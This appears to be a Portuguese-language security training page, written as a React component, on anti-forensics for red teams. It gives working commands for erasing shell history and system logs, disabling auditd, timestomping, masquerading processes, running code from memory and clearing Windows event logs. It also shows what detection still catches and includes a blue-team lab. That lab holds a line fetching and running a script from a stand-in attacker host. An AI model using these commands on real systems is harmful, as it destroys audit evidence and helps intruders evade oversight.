import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function AntiForense() {
  return (
    <PageContainer
      title="Anti-forense — apagar rastros"
      subtitle="Limpar logs, timestamps, swap, free space. Quando usar (red team), quando não usar (pentest), o que sempre sobra."
      difficulty="avancado"
      timeToRead="16 min"
    >
      <AlertBox type="danger" title="Pentest ≠ Red Team ≠ Crime">
        Em <strong>pentest</strong> você LOGA TUDO para o cliente — anti-forense é <em>contra</em>
        o ponto. Em <strong>red team</strong> você simula adversário real, então usa anti-forense
        DOCUMENTANDO no relatório. Fora desses contextos, apagar logs de sistema alheio é
        crime (CP Art. 313-A, Lei 12.737/12).
      </AlertBox>

      <h2>O que normalmente fica gravado (Linux)</h2>
      <OutputBlock label="onde a forense busca" type="muted">
{`/var/log/auth.log         — logins SSH, sudo
/var/log/syslog           — eventos do kernel
/var/log/btmp             — logins falhos
/var/log/wtmp             — logins ok (last/lastb)
/var/log/lastlog          — último login por user
/var/log/audit/audit.d/   — auditd (se ativo) — TUDO
/var/log/journal/         — systemd-journald (BINÁRIO)
~/.bash_history           — comandos shell
~/.zsh_history
~/.python_history
~/.viminfo                — arquivos abertos no vim
~/.config/                — sessions de vários apps
~/.cache/                 — thumbnails, browser cache
~/.local/share/RecentlyUsed-Files
/proc/[pid]/cmdline       — argv (mata processo, some)
/var/spool/mail/USER      — emails recebidos
/var/spool/cron/USER      — cronjobs (auditd loga edição)
/etc/audit/auditd.conf    — config do auditd
fs.timestamps (atime, mtime, ctime)`}
      </OutputBlock>

      <h2>Limpar bash_history (sem deixar pegada)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "1) durante a sessão — não escrever em disco",
            cmd: "unset HISTFILE && export HISTSIZE=0 && export HISTFILESIZE=0",
            out: "(silencioso. histórico não vai pra disco quando logout)",
            outType: "muted",
          },
          {
            comment: "alternativa — espaço inicial em cada comando (HISTCONTROL=ignorespace)",
            cmd: " ls -la /root  # note o espaço inicial — não vai pro history",
            out: `total 28
drwx------  4 root root 4096 Apr  4 00:42 .
drwxr-xr-x 19 root root 4096 Mar 31 08:14 ..`,
            outType: "default",
          },
          {
            comment: "2) durante: limpar buffer in-memory + flush para arquivo vazio",
            cmd: "history -c && history -w",
            out: "(silencioso. ~/.bash_history vai zerar no logout)",
            outType: "info",
          },
          {
            comment: "3) link /dev/null para nunca gravar (PERSISTENTE)",
            cmd: "ln -sf /dev/null ~/.bash_history",
            out: "(silencioso. próximo login: bash não consegue escrever)",
            outType: "warning",
          },
          {
            comment: "4) shred do existente (pega dados em sectors antigos)",
            cmd: "shred -u -n 5 ~/.bash_history ~/.zsh_history ~/.python_history",
            out: "(silencioso. -u = unlink, -n 5 = 5 passes random)",
            outType: "warning",
          },
        ]}
      />

      <h2>Limpar /var/log/* (precisa root)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "ATENÇÃO: zerar logs gera evento ÓBVIO em SIEM (gap de tempo + reset de inode)",
            cmd: "ls -la /var/log/auth.log",
            out: "-rw-r----- 1 syslog adm 142841 Apr  4 00:42 /var/log/auth.log",
            outType: "muted",
          },
          {
            comment: "abordagem amador — truncar (DEIXA RASTRO TRIVIAL)",
            cmd: "cat /dev/null > /var/log/auth.log",
            out: "(file size = 0, mas logger continua escrevendo. SOC vê queda)",
            outType: "error",
          },
          {
            comment: "abordagem médio — apagar SÓ as suas linhas",
            cmd: "sed -i '/192.168.1.107/d' /var/log/auth.log",
            out: "(remove só linhas com seu IP. mtime mudou — pode ser detectável)",
            outType: "warning",
          },
          {
            comment: "preservar mtime após edição",
            cmd: "touch -r /tmp/orig-time /var/log/auth.log",
            out: "(restaura mtime/atime/ctime do arquivo de referência)",
            outType: "muted",
          },
          {
            comment: "abordagem avançada: parar o syslogd, editar com hex, restartar com timestamp",
            cmd: "systemctl stop rsyslog && sed -i '/wallyson/d' /var/log/auth.log /var/log/secure /var/log/syslog && touch -t 202604040042 /var/log/auth.log && systemctl start rsyslog",
            out: `(silencioso. mas auditd se ativo capturou o stop do rsyslog → ainda detectável)`,
            outType: "default",
          },
        ]}
      />

      <h2>journald (systemd) — mais difícil</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "logs binários em /var/log/journal/",
            cmd: "journalctl -u sshd --since '1 hour ago' | head",
            out: `Apr 04 00:42:11 box sshd[4421]: Accepted publickey for wallyson from 192.168.1.107 port 51842
Apr 04 00:42:31 box sudo[4452]: wallyson : TTY=pts/0 ; PWD=/home/wallyson ; USER=root ; COMMAND=/bin/bash`,
            outType: "warning",
          },
          {
            comment: "vacuum por tamanho/tempo (preserva estrutura, parece manutenção normal)",
            cmd: "sudo journalctl --vacuum-time=10m",
            out: `Vacuuming done, freed 12.4M of archived journals from /var/log/journal/d3f4a5b6c7d8/.
Deleted archived journal /var/log/journal/d3f4a5b6c7d8/system@00060e2c8a1b.journal (8.4M).`,
            outType: "info",
          },
          {
            comment: "vacuum por tamanho — agressivo",
            cmd: "sudo journalctl --vacuum-size=1K",
            out: `Vacuuming done, freed 142.3M of archived journals from /var/log/journal/.
(restou só o journal ativo — visível no journalctl mas histórico apagado)`,
            outType: "warning",
          },
        ]}
      />

      <h2>auditd — o pesadelo do red teamer</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "verificar se está ativo",
            cmd: "systemctl is-active auditd && cat /etc/audit/audit.rules | head",
            out: `active
## First rule - delete all
-D
## Increase the buffers to survive stress events.
-b 8192
## Set failure mode to syslog notice. 
-f 1
[...]
-w /etc/passwd -p wa -k passwd_changes
-w /etc/shadow -p wa -k shadow_changes
-a always,exit -F arch=b64 -S execve -k commands     ← TODO comando exec é logado!`,
            outType: "warning",
          },
          {
            comment: "ver últimos logs",
            cmd: "sudo ausearch -k commands --start recent | head",
            out: `time->Thu Apr  4 00:42:31 2026
type=PROCTITLE msg=audit(1712202151.421:18421): proctitle=2F62696E2F636174002F6574632F736861646F77
type=PATH msg=audit(1712202151.421:18421): item=0 name="/bin/cat" inode=4248
type=CWD msg=audit(1712202151.421:18421): cwd="/home/wallyson"
type=EXECVE msg=audit(1712202151.421:18421): argc=2 a0="cat" a1="/etc/shadow"   ← seu comando!
type=SYSCALL msg=audit(1712202151.421:18421): arch=c000003e syscall=59 success=yes uid=0 auid=1000 [...]`,
            outType: "error",
          },
          {
            comment: "tentar parar auditd: deixa MARCA óbvia, é monitorado",
            cmd: "sudo systemctl stop auditd",
            out: `Failed to stop auditd.service: Operation refused.    ← protegido!
(em Debian moderno requer auditctl -e 0)`,
            outType: "warning",
          },
          {
            cmd: "sudo auditctl -e 0 ; auditctl -s | head",
            out: `enabled 0
failure 1
pid 4421
rate_limit 0
backlog_limit 8192
lost 0
backlog 0`,
            outType: "info",
          },
          {
            comment: "auditd CONTINUA logando o evento que VOCÊ desabilitou. SOC vê instantaneamente.",
            cmd: "sudo ausearch -m CONFIG_CHANGE --start recent | tail -3",
            out: `type=CONFIG_CHANGE msg=audit(1712202151.621:18422): op=set audit_enabled=0 old=1 auid=1000 ses=1 res=success
                                                                                                ↑ EVENTO ÓBVIO`,
            outType: "error",
          },
        ]}
      />

      <h2>Timestamps — anti-timestomping</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "ver os 4 timestamps de um arquivo",
            cmd: "stat /tmp/payload.sh",
            out: `  File: /tmp/payload.sh
  Size: 412         Blocks: 8          IO Block: 4096   regular file
Device: 802h/2050d  Inode: 4248        Links: 1
Access: 2026-04-04 00:42:31.421000000 -0300
Modify: 2026-04-04 00:42:18.001000000 -0300   ← quando você criou
Change: 2026-04-04 00:42:18.001000000 -0300
 Birth: 2026-04-04 00:42:18.001000000 -0300   ← btime (ext4)`,
            outType: "warning",
          },
          {
            comment: "alterar atime/mtime para parecer arquivo de sistema antigo",
            cmd: "touch -a -m -t 202301010800 /tmp/payload.sh && stat /tmp/payload.sh | grep -E 'Access|Modify'",
            out: `Access: 2023-01-01 08:00:00.000000000 -0300
Modify: 2023-01-01 08:00:00.000000000 -0300
Change: 2026-04-04 00:42:54.812000000 -0300   ← MAS ctime é IRRELEMENTÁVEL!`,
            outType: "info",
          },
          {
            comment: "ctime só muda com syscall — não dá para alterar exceto com debugfs (precisa unmount)",
            cmd: "echo 'ext4 birth time: ainda mais difícil. precisa debugfs offline'",
            out: `(forense usa ctime exatamente porque atacante esquece dele)`,
            outType: "muted",
          },
        ]}
      />

      <h2>Memória / swap</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "swap pode ter cifras, senhas em texto, fragmentos de RAM",
            cmd: "sudo swapon -s",
            out: `Filename                                Type            Size    Used    Priority
/swap.img                                file            4194300 824300  -2`,
            outType: "warning",
          },
          {
            comment: "limpar swap (require root + temporariamente sem swap)",
            cmd: "sudo swapoff -a && sudo dd if=/dev/zero of=/swap.img bs=1M count=4096 && sudo mkswap /swap.img && sudo swapon /swap.img",
            out: `4096+0 records in
4096+0 records out
4294967296 bytes (4.3 GB, 4.0 GiB) copied, 12.842 s, 334 MB/s
Setting up swapspace version 1, size = 4 GiB`,
            outType: "info",
          },
          {
            comment: "limpar slack space do FS (espaço entre arquivo lógico e bloco físico)",
            cmd: "sudo bleachbit --clean system.free_disk_space",
            out: `Special operation: system.free_disk_space
Wiping free disk space on /
Pass 1 of 1: writing zeros...
Wiped 142.3 GB of free space.`,
            outType: "default",
          },
        ]}
      />

      <h2>Process/file hiding</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "esconder processo via prctl (Linux 5.0+) — só seu shell vê",
            cmd: "python3 -c 'import ctypes; ctypes.CDLL(\"libc.so.6\").prctl(15, b\"[kworker/u16:1]\", 0, 0, 0)'",
            out: "(seu processo aparece como kworker no ps)",
            outType: "warning",
          },
          {
            comment: "rodar via memfd (sem tocar disco)",
            cmd: "python3 -c 'import os,base64; fd=os.memfd_create(\"x\"); os.write(fd, base64.b64decode(b\"...\")); os.execv(f\"/proc/self/fd/{fd}\",[\"x\"])'",
            out: "(binário executado direto da memória, NUNCA na disk)",
            outType: "info",
          },
          {
            comment: "ocultar arquivo com . (clássico) ou anexar a /tmp",
            cmd: "mv malware.bin /dev/shm/.cache_x; chmod 700 /dev/shm/.cache_x",
            out: "(/dev/shm = tmpfs em RAM, some no reboot. Não fica em /tmp do disco)",
            outType: "default",
          },
        ]}
      />

      <h2>Windows — clearev (Meterpreter)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "(meterpreter) clearev",
            out: `[*] Wiping 2042 records from Application...
[*] Wiping 8421 records from System...
[*] Wiping 12442 records from Security...   ← VISÍVEL no Defender for Identity como evento 1102!`,
            outType: "error",
          },
          {
            comment: "PowerShell limpa apenas event log específico (mais cirúrgico mas evento 104 fica)",
            cmd: "(no alvo) wevtutil cl Security",
            out: `(silencioso. EventID 1102 é gerado AUTOMATICAMENTE)`,
            outType: "warning",
          },
          {
            comment: "Evento 1102 = 'audit log was cleared' — alerta IMEDIATO em SOC moderno",
            cmd: "(no SIEM/Sentinel)",
            out: `Alert: AuditLog cleared by EMPRESA\\ana.silva on WS-RH at 04:42:31 GMT
Severity: HIGH
Action: investigate user immediately`,
            outType: "error",
          },
        ]}
      />

      <h2>O que SEMPRE fica</h2>
      <CommandTable
        title="Não dá para apagar (assume que ficou)"
        variations={[
          { cmd: "Logs de NETWORK (firewall, switch, IDS)", desc: "Fora do alvo, fora do seu controle.", output: "Você não toca." },
          { cmd: "EDR / XDR (CrowdStrike, SentinelOne)", desc: "Telemetria sai em tempo real para cloud.", output: "Mesmo se matar agente, dados já saíram." },
          { cmd: "SIEM agregado", desc: "Logs em servidor remoto (Splunk, Sentinel).", output: "Você não toca." },
          { cmd: "Cloud audit (CloudTrail, GCP Audit)", desc: "Imutável (write-once)+ replication.", output: "Mesmo log delete fica auditado." },
          { cmd: "Backup antes do ataque", desc: "Snapshot diário comum.", output: "Compromete logs apagados." },
          { cmd: "Forensic memory dump", desc: "Volatility extrai processos passados, conexões.", output: "Se chegou na máquina." },
          { cmd: "MFT (NTFS)", desc: "Master File Table guarda histórico.", output: "Forense recupera arquivo apagado." },
          { cmd: "Journal ext4/btrfs", desc: "Journal de FS guarda metadados.", output: "Mesmo após delete + shred." },
        ]}
      />

      <PracticeBox
        title="Lab: simule e detecte"
        goal="Vire blue team — veja o que sua atividade de red team deixa."
        steps={[
          "Em VM Linux: faça login SSH, rode 5 comandos suspeitos (cat /etc/shadow, sudo nmap, etc.).",
          "Tente apagar bash_history + auth.log.",
          "Como blue team: rode lynis audit + grep -E 'sudo|root' /var/log/* + ausearch.",
          "Conte quantos artefatos sobreviveram à sua limpeza.",
        ]}
        command={`# como atacante (logado SSH)
cat /etc/shadow > /dev/null
sudo nmap localhost
wget http://atacante.com/script.sh && chmod +x script.sh && ./script.sh

# limpeza amadora
history -c
sudo cat /dev/null > /var/log/auth.log
shred -u ~/.bash_history

# blue team — descobrir
echo "--- journald ---"
journalctl --since '1 hour ago' | grep -iE 'shadow|nmap|wget|sudo'

echo "--- auditd ---"
sudo ausearch --start recent -i | grep -iE 'shadow|nmap'

echo "--- syslog journal não-volatil ---"
sudo journalctl -b -1 | grep wallyson  # boot anterior, fora do reach

echo "--- inode timestamps ---"
sudo find / -newer /tmp/marker -type f 2>/dev/null | head -20`}
        expected={`(mesmo após "limpar" tudo, blue vê)
- /etc/shadow lido (auditd evento)
- nmap executado (auditd execve + EXEC)
- wget de domínio externo (DNS log + journald)
- script.sh criado (find -newer mostra)
- history apagado é EM SI um IoC (auditd VFS evento)`}
        verify="Mensagem pra você: anti-forense PARCIAL é PIOR que nenhum. Ou faz 100% (desligar EDR antes de qualquer ação) ou aceita que tudo será visto."
      />

      <AlertBox type="warning" title="Realista: anti-forense em 2026">
        Em ambiente moderno (EDR + SIEM + cloud audit + immutable logs), <strong>anti-forense
        clássica não existe mais</strong>. Estratégia de red team atual: <em>ser silencioso</em>
        (LOTL — living off the land), não <em>limpar depois</em>. Use binários built-in,
        comandos esperados, horário de pico, comportamento mimicando admin legítimo.
      </AlertBox>

      <AlertBox type="info" title="Em pentest profissional">
        Você ENTREGA timestamps de cada ação, comandos rodados (asciinema), arquivos
        plantados (com timestamp + propósito). O cliente precisa saber o que limpar.
        Anti-forense em pentest = quebra de contrato.
      </AlertBox>
    </PageContainer>
  );
}
